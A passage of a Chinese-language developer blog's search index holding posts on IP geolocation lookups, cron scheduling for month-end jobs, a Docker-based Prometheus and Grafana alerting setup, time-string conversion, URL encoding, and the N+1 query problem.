取得國家資訊方法","url":"/blog/2019/09/17/%E6%8A%93-IP-%E5%8F%96%E5%BE%97%E5%9C%8B%E5%AE%B6%E8%B3%87%E8%A8%8A%E6%96%B9%E6%B3%95/","content":"<p>今天看到有用 API 查 IP 是哪個國家方法<br>不知 Server 會真的這樣做? (打外面網站)<br>我一直以為可以直接看 IP 方式分辨<br>所以爬了一下文</p>\n<a id=\"more\"></a>\n<h2 id=\"Discuz-解析IP-位置\"><a href=\"#Discuz-解析IP-位置\" class=\"headerlink\" title=\"Discuz 解析IP 位置\"></a>Discuz 解析IP 位置</h2><p>記得以前進去某些論壇可以看到 訪客 國家<br>找了一下，真的不需要打 API<br><a href=\"https://blog.csdn.net/lih062624/article/details/70207925\" target=\"_blank\" rel=\"noopener\">Discuz!开发之IP地址的解析方法 - 土著人宁巴的Discuz!专栏 - CSDN博客</a></p>\n<h2 id=\"免費打-API\"><a href=\"#免費打-API\" class=\"headerlink\" title=\"免費打 API\"></a>免費打 API</h2><p>有看到這個 API 沒有限制一天打的流量</p>\n<p><a href=\"https://about.ip2c.org/#about\" target=\"_blank\" rel=\"noopener\">ip2c.org | free IP to Country server | self-updating every day</a></p>\n<h2 id=\"可抓-IP-資料到本地端\"><a href=\"#可抓-IP-資料到本地端\" class=\"headerlink\" title=\"可抓 IP 資料到本地端\"></a>可抓 IP 資料到本地端</h2><h3 id=\"MAXMIND\"><a href=\"#MAXMIND\" class=\"headerlink\" title=\"MAXMIND\"></a>MAXMIND</h3><p><a href=\"https://dev.maxmind.com/geoip/geoip2/geolite2/#Databases\" target=\"_blank\" rel=\"noopener\">GeoLite2 Free Downloadable Databases « MaxMind Developer Site</a></p>\n<p><a href=\"https://dev.maxmind.com/geoip/geoip2/downloadable/#MaxMind_APIs\" target=\"_blank\" rel=\"noopener\">GeoIP2 Downloadable Databases « MaxMind Developer Site</a></p>\n<p>連套件都幫妳寫好了!!!真佛心</p>\n<h3 id=\"DBIP\"><a href=\"#DBIP\" class=\"headerlink\" title=\"DBIP\"></a>DBIP</h3><p><a href=\"https://db-ip.com/db/lite.php\" target=\"_blank\" rel=\"noopener\">Free IP Geolocation Database Downloads | DB-IP Lite</a></p>\n<h2 id=\"其他-API-網站\"><a href=\"#其他-API-網站\" class=\"headerlink\" title=\"其他 API 網站\"></a>其他 API 網站</h2><p><a href=\"https://db-ip.com/tutorials/php-get-visitor-country\" target=\"_blank\" rel=\"noopener\">Tutorials and Code Samples for Finding Website Visitor Country Data</a></p>\n<p><a href=\"https://medium.com/@ipdata_co/what-is-the-best-commercial-ip-geolocation-api-d8195cda7027\" target=\"_blank\" rel=\"noopener\">What is the Best IP Geolocation API? - The ipdata Team - Medium</a></p>\n<p><a href=\"https://ipinfodb.com/\" target=\"_blank\" rel=\"noopener\">IP Info, IP Geolocation Tools and API| IPInfoDB</a></p>\n<p><a href=\"https://stackoverflow.com/questions/19514749/best-ip-to-country-database\" target=\"_blank\" rel=\"noopener\">geolocation - Best IP to Country Database - Stack Overflow</a></p>\n<p><a href=\"https://stackoverflow.com/questions/19514749/best-ip-to-country-database\" target=\"_blank\" rel=\"noopener\">geolocation - Best IP to Country Database - Stack Overflow</a></p>\n<p>有空用在補充</p>\n","categories":["實用工具"],"tags":["ip"]},{"title":"抓出 Docker 裡面檔案設定檔出來","url":"/blog/2021/04/15/%E6%8A%93%E5%87%BA-Docker-%E8%A3%A1%E9%9D%A2%E6%AA%94%E6%A1%88%E8%A8%AD%E5%AE%9A%E6%AA%94%E5%87%BA%E4%BE%86/","content":"<p>之前這篇有提到 cp 指令<a href=\"https://malagege.github.io/blog/2017/08/20/logdown/2017-08-20-2201711/\">Docker 新手筆記 | 程式狂想筆記</a><br>但一直找有什麼方便複製 image 檔案<br>今天看到相關網站方法<br>整理出來</p>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker create --name prom_empty prom/prometheus</span><br><span class=\"line\"><span class=\"comment\"># docker create ：創建一個新的容器但不啟動它</span></span><br><span class=\"line\">docker cp prom_empty:/etc/prometheus/prometheus.yml ./prometheus.yml</span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://blog.alexellis.io/prometheus-nodeexporter-rpi/\" target=\"_blank\" rel=\"noopener\">Monitor your Raspberry Pi cluster with Prometheus and Docker</a></p>\n","categories":["Docker"],"tags":["docker"]},{"title":"排程 crontab 時間設定月底執行方法","url":"/blog/2019/08/04/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/","content":"<p>最近專案需要設定排程<br>主機上面的時區是 UTC+0 時間<br>但我們需要照 GMT+8 執行<br>排程往前面推-8 小時<br>但這時候遇到一個問題了<br>設定月初時間會跨前一天問題</p>\n<a id=\"more\"></a>\n<h2 id=\"排程設定-L-字符\"><a href=\"#排程設定-L-字符\" class=\"headerlink\" title=\"排程設定 L 字符\"></a>排程設定 L 字符</h2><p><code>0 16 L * * *</code></p>\n<p>有些排程工具是支援的 (spring, quartz)<br>LINUX crontab 不支援</p>\n<h2 id=\"shell-程式執行判斷\"><a href=\"#shell-程式執行判斷\" class=\"headerlink\" title=\"shell 程式執行判斷\"></a>shell 程式執行判斷</h2><p>最近專案需要在 Rancher 設定<br>所以上面的方法無法用<br>有參考使用<a href=\"https://www.opencli.com/linux/crontab-run-on-last-day-of-month\" target=\"_blank\" rel=\"noopener\">Crontab 每月最後一天執行 Shell Script</a><br>可以完成，範例如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 沒有環境變數，為true</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -z <span class=\"string\">\"<span class=\"variable\">$MODE</span>\"</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    php .....</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"comment\"># 時間用 0 0 28-31 * *</span></span><br><span class=\"line\">    <span class=\"comment\"># 日期加一天為1，就算是今日事月底最後一天</span></span><br><span class=\"line\">    DAY=$(date -d <span class=\"string\">\"<span class=\"variable\">$(date +%Y-%m-%d)</span> +1 day\"</span> +%e)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$MODE</span>\"</span> = <span class=\"string\">'monthoflastday'</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">test</span> <span class=\"variable\">$DAY</span> -eq 1; <span class=\"keyword\">then</span></span><br><span class=\"line\">            <span class=\"comment\">#  run the script here</span></span><br><span class=\"line\">            php ......</span><br><span class=\"line\">        <span class=\"keyword\">fi</span>;</span><br><span class=\"line\">    <span class=\"keyword\">fi</span>;</span><br><span class=\"line\"><span class=\"keyword\">fi</span>;</span><br></pre></td></tr></table></figure>\n<p>簡單說明就是 Rancher 要跑的 JOB 要多一個 <code>MODE</code> 環境變數<br>透過這個知道哪個要執行月底執行，有些不用</p>\n<h2 id=\"crontab-簡單判斷方法\"><a href=\"#crontab-簡單判斷方法\" class=\"headerlink\" title=\"crontab 簡單判斷方法\"></a>crontab 簡單判斷方法</h2><p>55 23 28-31 * * [[ “$(date –date=tomorrow +\\%d)” == “01” ]] &amp;&amp; myjob.sh<br>參考<a href=\"https://stackoverflow.com/questions/6139189/cron-job-to-run-on-the-last-day-of-the-month\" target=\"_blank\" rel=\"noopener\">automation - Cron job to run on the last day of the month - Stack Overflow</a></p>\n<p>其他 date 設置可以參考<br><a href=\"https://blog.longwin.com.tw/2010/07/linux-date-computer-2010/\" target=\"_blank\" rel=\"noopener\">Linux 使用 date 計算時間(昨天、明天) | Tsung’s Blog</a><br><a href=\"https://www.cnblogs.com/tangtianfly/p/3457668.html\" target=\"_blank\" rel=\"noopener\">linux 中用 shell 获取时间,日期 - ccmaotang - 博客园</a></p>\n<h2 id=\"shell-跑時間迴圈方法\"><a href=\"#shell-跑時間迴圈方法\" class=\"headerlink\" title=\"shell 跑時間迴圈方法\"></a>shell 跑時間迴圈方法</h2><p>另外 shell 跑時間迴圈方法<br><a href=\"https://stackoverflow.com/questions/28226229/bash-looping-through-dates\" target=\"_blank\" rel=\"noopener\">Bash: Looping through dates - Stack Overflow</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">d=2015-01-01</span><br><span class=\"line\"><span class=\"keyword\">while</span> [ <span class=\"string\">\"<span class=\"variable\">$d</span>\"</span> != 2015-02-20 ]; <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"variable\">$d</span></span><br><span class=\"line\">  d=$(date -I -d <span class=\"string\">\"<span class=\"variable\">$d</span> + 1 day\"</span>)</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n<p>其他參考來源:</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/6139189/cron-job-to-run-on-the-last-day-of-the-month\" target=\"_blank\" rel=\"noopener\">automation - Cron job to run on the last day of the month - Stack Overflow</a></li>\n<li><a href=\"https://stackoverflow.com/questions/3601515/how-to-check-if-a-variable-is-set-in-bash\" target=\"_blank\" rel=\"noopener\">shell - How to check if a variable is set in Bash? - Stack Overflow</a></li>\n<li><a href=\"https://unix.stackexchange.com/questions/89188/cron-allowed-special-character-l-for-last-day-of-the-month-on-debian\" target=\"_blank\" rel=\"noopener\">Cron allowed special character “L” for “Last day of the month” on Debian - Unix &amp; Linux Stack Exchange</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Cron#Format\" target=\"_blank\" rel=\"noopener\">cron - Wikipedia</a></li>\n<li><a href=\"https://stackoverflow.com/questions/49295240/jenkins-run-job-2-days-before-end-of-every-month\" target=\"_blank\" rel=\"noopener\">date - Jenkins -run job 2 days before end of every month - Stack Overflow</a></li>\n<li><a href=\"https://github.com/xr09/cron-last-sunday/blob/master/run-if-today\" target=\"_blank\" rel=\"noopener\">cron-last-sunday/run-if-today at master · xr09/cron-last-sunday</a></li>\n<li><a href=\"http://linux.vbird.org/linux_basic/0430cron.php#anacron_1\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十五章、例行性工作排程(crontab)</a></li>\n<li><a href=\"https://www.i7dom.cn/179/2019/13/linux-cron-cycle.html\" target=\"_blank\" rel=\"noopener\">linux下crontab与anacrontab的使用 - 小柒吃地瓜</a></li>\n</ul>\n","categories":["Linux"],"tags":["linux"]},{"title":"新手快速 Prometheus 使用 Docker 快速 10 分鐘建置環境","url":"/blog/2021/04/05/%E6%96%B0%E6%89%8B%E5%BF%AB%E9%80%9F-Prometheus-%E4%BD%BF%E7%94%A8-Docker-%E5%BF%AB%E9%80%9F-10-%E5%88%86%E9%90%98%E5%BB%BA%E7%BD%AE%E7%92%B0%E5%A2%83/","content":"<p>首先，最近再找能跑的 prometheus 的 docker-compose 檔案<br>快速建置流程，體驗裡面介面功能</p>\n<a id=\"more\"></a>\n<h2 id=\"快速實例\"><a href=\"#快速實例\" class=\"headerlink\" title=\"快速實例\"></a>快速實例</h2><p><a href=\"https://github.com/Kev1nChan/docker-prometheus\" target=\"_blank\" rel=\"noopener\">https://github.com/Kev1nChan/docker-prometheus</a></p>\n<p>我找到一個 Github 實例，可以馬上 docker-compose 吃到 Node Exporter 設備<br>其他 Project 都不能順利執行…</p>\n<p>可以先把grafana 版號拿掉，裝最新版</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">image:</span> <span class=\"string\">grafana/grafana</span></span><br></pre></td></tr></table></figure>\n<p>git clone 下來<br>直接執行 <code>docker-compose up -d</code></p>\n<p>這邊可以window 可以把 <code>$PWD</code> 改成<code>.</code><br>powershell 才不會執行有問題</p>\n<blockquote>\n<p>使用前请修改Grafana配置文件中密码，当前admin密码为qwe123!@#</p>\n</blockquote>\n<h3 id=\"設定-Grafana\"><a href=\"#設定-Grafana\" class=\"headerlink\" title=\"設定 Grafana\"></a>設定 Grafana</h3><p>新增 DataSource ，選擇 Prometheus</p>\n<p><img src=\"https://i.imgur.com/RsmdEbZ.png\" alt=\"\"></p>\n<p>注意!!這邊由於是裝在 docker 裡面<br>我們這邊 URL 路徑是要輸入 prometheus:</p>\n<h3 id=\"匯入-Dashboard\"><a href=\"#匯入-Dashboard\" class=\"headerlink\" title=\"匯入 Dashboard\"></a>匯入 Dashboard</h3><p>很多教學，都沒有說要怎麼匯入別人寫好的 Dashboard<br>剛用這個新手應該都不會用吧</p>\n<p><a href=\"https://grafana.com/grafana/dashboards/8919\" target=\"_blank\" rel=\"noopener\">https://grafana.com/grafana/dashboards/8919</a><br>這個網站可以找人加分享好用的 Dashboard</p>\n<p><img src=\"https://i.imgur.com/2UUIdQ3.png\" alt=\"\"></p>\n<p>這邊 import 進去來後，記得要選 datasource</p>\n<p><img src=\"https://i.imgur.com/3GpZ9EU.png\" alt=\"\"></p>\n<p>這邊 Grafana 就設定完了</p>\n<h3 id=\"通知教學\"><a href=\"#通知教學\" class=\"headerlink\" title=\"通知教學\"></a>通知教學</h3><h2 id=\"信箱設定\"><a href=\"#信箱設定\" class=\"headerlink\" title=\"信箱設定\"></a>信箱設定</h2><p>假設不想用真實信箱，可以用我之前fake stmp email 工具來設定<br><a href=\"https://malagege.github.io/blog/2018/12/09/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/\">maildev試用筆記 | 程式狂想筆記</a></p>\n<p>安裝maildev</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d -p 1080:80 -p 1025:25 djfarrelly/maildev</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim alertmanager/config.yml</span><br></pre></td></tr></table></figure>\n<p>設定 stmp 1025, tls = false ，帳號、密碼可以不用理(畢竟是假的…)</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">global:</span></span><br><span class=\"line\">  <span class=\"comment\">#163服务器</span></span><br><span class=\"line\"><span class=\"attr\">  smtp_smarthost:</span> <span class=\"string\">'192.168.1.113:1025'</span></span><br><span class=\"line\">  <span class=\"comment\">#发邮件的邮箱</span></span><br><span class=\"line\"><span class=\"attr\">  smtp_from:</span> <span class=\"string\">'your-email@foxmail.com'</span></span><br><span class=\"line\">  <span class=\"comment\">#发邮件的邮箱用户名，也就是你的邮箱　　　　　</span></span><br><span class=\"line\"><span class=\"attr\">  smtp_auth_username:</span> <span class=\"string\">'your-email@foxmail.com'</span></span><br><span class=\"line\">  <span class=\"comment\">#发邮件的邮箱密码</span></span><br><span class=\"line\"><span class=\"attr\">  smtp_auth_password:</span> <span class=\"string\">'your-password'</span></span><br><span class=\"line\">  <span class=\"comment\">#进行tls验证</span></span><br><span class=\"line\"><span class=\"attr\">  smtp_require_tls:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">route:</span></span><br><span class=\"line\"><span class=\"attr\">  group_by:</span> <span class=\"string\">['alertname']</span></span><br><span class=\"line\"><span class=\"attr\">  group_wait:</span> <span class=\"number\">10</span><span class=\"string\">s</span></span><br><span class=\"line\"><span class=\"attr\">  group_interval:</span> <span class=\"number\">10</span><span class=\"string\">s</span></span><br><span class=\"line\"><span class=\"attr\">  repeat_interval:</span> <span class=\"number\">10</span><span class=\"string\">m</span></span><br><span class=\"line\"><span class=\"attr\">  receiver:</span> <span class=\"string\">live-monitoring</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">receivers:</span></span><br><span class=\"line\"><span class=\"attr\">- name:</span> <span class=\"string\">'live-monitoring'</span></span><br><span class=\"line\">  <span class=\"comment\">#收邮件的邮箱</span></span><br><span class=\"line\"><span class=\"attr\">  email_configs:</span></span><br><span class=\"line\"><span class=\"attr\">  - to:</span> <span class=\"string\">'your-email@163.com'</span></span><br></pre></td></tr></table></figure>\n<p>讓你的 alertmanager 發送 mail<br>只需要讓你 node_exporter 結束程式就可以了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker-compose stop node_exporter</span><br></pre></td></tr></table></figure>\n<p>執行完，稍後兩分鐘…(因為設定是兩分鐘)，可以看到mail 會發送到maildev</p>\n<p><img src=\"https://i.imgur.com/RewTNHy.png\" alt=\"\"></p>\n<p>話說 granafan 也有通知功能</p>\n<h3 id=\"discord-通知\"><a href=\"#discord-通知\" class=\"headerlink\" title=\"discord 通知\"></a>discord 通知</h3><p><a href=\"https://github.com/benjojo/alertmanager-discord\" target=\"_blank\" rel=\"noopener\">GitHub - benjojo/alertmanager-discord: Take your alertmanager alerts, into discord</a></p>\n<p>相關建置我後面文章有講到</p>\n<h3 id=\"line-通知\"><a href=\"#line-通知\" class=\"headerlink\" title=\"line 通知\"></a>line 通知</h3><p><a href=\"https://xenby.com/b/274-%E6%95%99%E5%AD%B8-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-line-notify-%E5%B0%8D%E7%BE%A4%E7%B5%84%E9%80%B2%E8%A1%8C%E9%80%9A%E7%9F%A5\" target=\"_blank\" rel=\"noopener\">[教學] 如何使用 Line Notify 對群組進行通知 | 辛比誌</a><br>設定 line notify ，不需要服務登入<br><img src=\"https://i.imgur.com/G110MnW.png\" alt=\"\"></p>\n<p><a href=\"https://stackoverflow.com/questions/53372935/how-can-i-config-prometheus-alert-with-line-notify\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/questions/53372935/how-can-i-config-prometheus-alert-with-line-notify</a><br>&lt;–這個連結不能使用</p>\n<p><strong>TOKEN記得要留著，否則之後不會找到</strong></p>\n<p>記得要邀請 line notify 到聊天裡面去<br><img src=\"https://i.imgur.com/Dyf1Fda.png\" alt=\"\"></p>\n<p>否則不會收到</p>\n<blockquote>\n<p>此帳號尚未被邀請至已連動「測試bot」的群組中。請將此帳號邀請至「去」中。</p>\n</blockquote>\n<h3 id=\"架設-line-notify-gateway\"><a href=\"#架設-line-notify-gateway\" class=\"headerlink\" title=\"架設 line notify gateway\"></a>架設 line notify gateway</h3><p>官方沒推薦使用哪一個line notify<br>可能國外很少用</p>\n<p>這篇有找到<a href=\"https://nontster.medium.com/line-notify-gateway-2-f117c20c6f62\" target=\"_blank\" rel=\"noopener\">line-notify-gateway (2). ใน blog… | by Nont Banditwong | Medium</a><br>雖然看不懂裡面文章<br>但從指令可以看出東西</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d -p 18081:18081 -e line-notify.personal-access-token=<span class=\"string\">'&#123;換成你的TOKEN&#125;'</span> --name line-notify-gateway nontster/line-notify-gateway</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">receivers:</span></span><br><span class=\"line\"><span class=\"attr\">- name:</span> <span class=\"string\">line-noti</span></span><br><span class=\"line\"><span class=\"attr\">  webhook_configs:</span></span><br><span class=\"line\"><span class=\"attr\">  - url:</span> <span class=\"attr\">http://192.168.73.161:18081/v1/alertmanager/payload</span></span><br><span class=\"line\"><span class=\"attr\">    send_resolved:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n<p>測試alertmanager 訊息<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -H <span class=\"string\">\"Content-type: application/json\"</span> -X POST -d <span class=\"string\">'&#123;\"recei\"status\":\"firing\",\"alerts\":[&#123;\"status\":\"firing\",\"labels\":&#123;\"alertname\":\"InstanceDown\",\"instance\":\"director1:9100\",\"job\":\"ipvs\",\"severity\":\"critical\"&#125;,\"annotations\":&#123;\"description\":\"director1:9100 of job ipvs has been down for  more than 5 minutes.\",\"summary\":\"Instance director1:9100 down\"&#125;,\"startsAt\":\"2019-06-09T09:12:56.795099989Z\",\"endsAt\":\"0001-01-01T00:00:00Z\",\"generatorURL\":\"http://72426f0cd030:9090/graph?g0.expr=up+%3D%3D+0&amp;g0.tab=1\"&#125;],\"groupLabels\":&#123;\"alertname\":\"InstanceDown\"&#125;,\"commonLabels\":&#123;\"alertname\":\"InstanceDown\",\"instance\":\"director1:9100\",\"job\":\"ipvs\",\"severity\":\"critical\"&#125;,\"commonAnnotations\":&#123;\"description\":\"director1:9100 of job ipvs has been down for  more than 5 minutes.\",\"summary\":\"Instance director1:9100 down\"&#125;,\"externalURL\":\"http://alertmanager:9093\",\"version\":\"4\",\"groupKey\":\"&#123;&#125;:&#123;alertname=\\\"InstanceDown\\\"&#125;\"&#125;'</span> http://localhost:18081/v1/alertmanager/payload</span><br></pre></td></tr></table></figure></p>\n<p>測試結果可進行運行</p>\n<h2 id=\"監控\"><a href=\"#監控\" class=\"headerlink\" title=\"監控\"></a>監控</h2><p>裡面有內建設定 exporter 服務沒偵測到兩分鐘會發送通知<br>除了這些外，還有 traefik exporter ,blackbox exporter, 各種 exporter等等</p>\n<p><a href=\"https://prometheus.io/docs/instrumenting/exporters/\" target=\"_blank\" rel=\"noopener\">Exporters and integrations | Prometheus</a></p>\n<p>接下來還有很長一段要學習的路</p>\n","categories":["Prometheus"],"tags":["prometheus","exporter"]},{"title":"時間換算的小技巧","url":"/blog/2018/11/07/%E6%99%82%E9%96%93%E6%8F%9B%E7%AE%97%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/","content":"<p>01:10 字串換算秒數很麻煩<br>今天看到神奇的解法<br>筆記筆記</p>\n<a id=\"more\"></a>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$time=<span class=\"string\">\"01:10\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (array_reverse(explode(<span class=\"string\">':'</span>, $time)) <span class=\"keyword\">as</span> $index =&gt; $value) $sec += pow(<span class=\"number\">60</span>, $index) * $value;</span><br></pre></td></tr></table></figure>\n<p>最近看到神同事寫這段超短<br>超漂亮<br>我從來沒有想到<code>pow</code>可以運用到這個地方<br>雖然程效上，只會跑兩層<br>到24小時就換一天了XD<br>不過寫得真的很漂亮<br>稍微改成js版本</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> time = <span class=\"string\">'01:01'</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> time_array = time.split(<span class=\"string\">':'</span>).reverse()</span><br><span class=\"line\"><span class=\"keyword\">var</span> sec = <span class=\"number\">0</span></span><br><span class=\"line\">time_array.forEach(  <span class=\"function\">(<span class=\"params\">value,index</span>) =&gt;</span> sec += <span class=\"built_in\">Math</span>.pow(<span class=\"number\">60</span>,index) * value  );</span><br></pre></td></tr></table></figure>","categories":["JavaScript"],"tags":["javascript"]},{"title":"有關 url 空白字符(%20和+)","url":"/blog/2020/03/18/%E6%9C%89%E9%97%9C-url-%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6-20%E5%92%8C/","content":"<p>最近做 js 測試時後發現<br>我寫這麼久才注意到這個東西<br>這邊小記一下</p>\n<p>簡單來說<code>%20</code>和(<code>+</code>)加號都是變成<code>空白鍵</code><br>相反的<code>%2B</code>會變成<code>+</code></p>\n<p><a href=\"http://httpbin.org/get?test=123%20123\" target=\"_blank\" rel=\"noopener\">http://httpbin.org/get?test=123%20123</a></p>\n<p>動手測試比較快</p>\n<a id=\"more\"></a>\n<blockquote>\n<p>當HTML表單中的數據被提交時，表單的域名與值被編碼並通過HTTP的GET或者POST方法甚至更古遠的email[2]把請求發送給伺服器。這裡的編碼方法採用了一個非常早期的通用的URI百分號編碼方法，並且有很多小的修改如新行規範化以及把空格符的編碼”%20”替換為”+” . 按這套方法編碼的數據的MIME類型是application/x-www-form-urlencoded, 當前仍用於（雖然非常過時了）HTML與XForms規範中. 此外，CGI規範包括了web伺服器如何解碼這類數據、利用這類數據的內容。</p>\n</blockquote>\n<blockquote>\n<p>如果發送的是HTTP GET請求, application/x-www-form-urlencoded數據包含在所請求URI的查詢成分中. 如果發送的是HTTP POST請求或通過email, 數據被放置在消息體中，媒體類型的名字被包含在消息的Content-Type頭內部。 </p>\n</blockquote>\n<p><a href=\"https://stackoverflow.com/questions/1634271/url-encoding-the-space-character-or-20\" target=\"_blank\" rel=\"noopener\">URL encoding the space character: + or %20? - Stack Overflow</a></p>\n<p><a href=\"https://stackoverflow.com/questions/5330104/encoding-url-query-parameters-in-java\" target=\"_blank\" rel=\"noopener\">urlencode - Encoding URL query parameters in Java - Stack Overflow</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000006063123\" target=\"_blank\" rel=\"noopener\">你所不知道 ❌ URL - 小二の伤寒杂病论 - SegmentFault 思否</a><br><a href=\"https://segmentfault.com/a/1190000006043397\" target=\"_blank\" rel=\"noopener\">你所不知道 ❌ PHP POST - 小二の伤寒杂病论 - SegmentFault 思否</a></p>\n","categories":["HTML"],"tags":["html"]},{"title":"有關程式 N+1 問題","url":"/blog/2019/05/21/%E6%9C%89%E9%97%9C%E7%A8%8B%E5%BC%8F-N-1-%E5%95%8F%E9%A1%8C/","content":"<p>最近在做複雜的 API<br>由於 PM 覺得某一個 JSON 屬性調整<br>結果需要改好幾隻程式 API<br>不過有查到可以使用<a href=\"https://graphql.cn/\" target=\"_blank\" rel=\"noopener\">GraphQL | 一种为你的 API 而生的查询语言</a><br>但這篇不是重點在 GraphQL<br>而是我探索某一篇 <a href=\"https://jerryzou.com/posts/10-questions-about-graphql/\" target=\"_blank\" rel=\"noopener\">阻碍你使用 GraphQL 的十个问题 | 咀嚼之味</a></p>\n<blockquote>\n<p>它就像是一顆無限向下延伸的樹。所以在我看來，GraphQL 更應該叫 TreeQL，當然在圖論裡，Tree 就是 Graph 也沒毛病啦。需要注意的是，這也會引出 「N + 1 problem」 的話題——naive 的 GraphQL 服務端實現會讓這段 query 變得異常慢！</p>\n</blockquote>\n<p>看了一下內容，N+1 問題就有像一個查詢每一行執行 SQL<br>如下</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> <span class=\"string\">`song`</span> <span class=\"keyword\">LIMIT</span> <span class=\"number\">0</span>, <span class=\"number\">20</span>;</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> <span class=\"string\">`singer`</span> <span class=\"keyword\">WHERE</span> <span class=\"string\">`id`</span> = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> <span class=\"string\">`singer`</span> <span class=\"keyword\">WHERE</span> <span class=\"string\">`id`</span> = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> <span class=\"string\">`singer`</span> <span class=\"keyword\">WHERE</span> <span class=\"string\">`id`</span> = <span class=\"number\">3</span>;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>奇怪，這個怎麼讓我想到 ORM 也是這樣<br>所以我查了一下 ORM 真的也有這個問題<br>由於最近也想開使用 ORM ，所以進入前想了解之後使用上會遇到什麼問題<br>這邊只會先整理</p>\n<a id=\"more\"></a>\n<h2 id=\"DataLoader\"><a href=\"#DataLoader\" class=\"headerlink\" title=\"DataLoader\"></a>DataLoader</h2><p>目前查到資料可以用 <code>DataLoader</code> 方式解決問題</p>\n<blockquote>\n<p>Dataloader 主要有兩項功能： Batching (批次) &amp; Caching (快取) 。<br>Batching 在於他能夠將想要進 db 搜尋的 id 都搜集起來，等時間到了一次進 db 搜尋，解決 N + 1 問題。<br>Caching 在於它在紀錄 id 時會做 memoization ，所以未來若是有重複的 id 進來就會被剔除，保證資料索取數越少越好。</p>\n</blockquote>\n<p><a href=\"https://ithelp.ithome.com.tw/articles/10207606\" target=\"_blank\" rel=\"noopener\">GraphQL Design: 使用 DataLoader 提升效能 ! - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<p>有爬到這篇有 10000 一筆一筆方式撈出來<br>得到<br><a href=\"https://medium.com/@festime/%E7%94%A8%E7%AF%84%E4%BE%8B%E7%A8%8B%E5%BC%8F%E5%AF%A6%E9%9A%9B%E6%8E%A2%E7%B4%A2-n-1-query-%E6%9C%89%E5%A4%9A%E5%8F%AF%E6%80%95-b89e7735ea81\" target=\"_blank\" rel=\"noopener\">用範例程式實際探索 N + 1 query 有多可怕 – Yulin Chen – Medium</a></p>\n<h2 id=\"Laravel-ORM-解決\"><a href=\"#Laravel-ORM-解決\" class=\"headerlink\" title=\"Laravel ORM 解決\"></a>Laravel ORM 解決</h2><blockquote>\n<p>Laravel 中解決 N + 1 問題<br>使用預加載功能<br>使用 with() 方法，會做緩存<br>with() 中放需要查詢的關聯屬性<br><a href=\"https://learnku.com/laravel/t/7778/summary-using-the-laravel-development-tool-the-n-1-problem-of-the-orm-query\" target=\"_blank\" rel=\"noopener\">總結要點：使用 Laravel 開發工具，ORM 查詢的 N + 1 問題 | Laravel China 社區 - 高品質的 Laravel 開發者社區</a></p>\n</blockquote>\n<h2 id=\"我自己想到的方法\"><a href=\"#我自己想到的方法\" class=\"headerlink\" title=\"我自己想到的方法\"></a>我自己想到的方法</h2><p>由於 sharding 不能做 join 動作，所以我使用<code>where in (id list)</code>方式查詢<br>但這種方法程式一寫差錯，可能程式就<code>500</code>了</p>\n<p>其中有一篇 Eager 